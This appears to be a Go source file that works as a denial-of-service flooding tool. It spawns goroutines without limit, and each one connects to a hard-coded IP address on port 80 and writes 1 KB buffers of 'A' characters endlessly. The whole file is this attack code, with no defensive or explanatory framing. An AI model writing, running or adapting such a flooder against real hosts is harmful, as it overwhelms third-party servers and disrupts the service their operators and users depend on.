package main

import (
	"fmt"
	"net"
	"os"
)

func main() {
	message := make([]byte, 1024) // 1 KB message
	for i := range message {
		message[i] = 'A'
	}

	for {
		go func() {
			// Connect to the server
			conn, err := net.Dial("tcp", "193.228.196.49:80")
			if err != nil {
				fmt.Println(err)
				os.Exit(1)
			}
			defer conn.Close()

			for {
				conn.Write(message)
			}
		}()
	}
}
